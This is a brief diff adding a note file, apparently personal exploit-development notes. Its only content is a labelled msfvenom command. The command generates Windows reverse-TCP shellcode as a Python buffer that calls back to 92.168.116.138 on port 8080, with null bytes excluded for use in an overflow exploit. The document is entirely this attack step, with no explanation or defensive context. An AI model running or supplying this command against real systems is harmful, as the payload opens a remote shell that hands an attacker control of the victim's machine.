@@ -1,0 +1,4 @@
+shell code generating command
+msfvenom -p windows/shell_reverse_tcp LHOST=92.168.116.138 LPORT=8080 EXITFUNC=thread -f python -a x86 --platform windows -b "\x00" -v buf
+
+
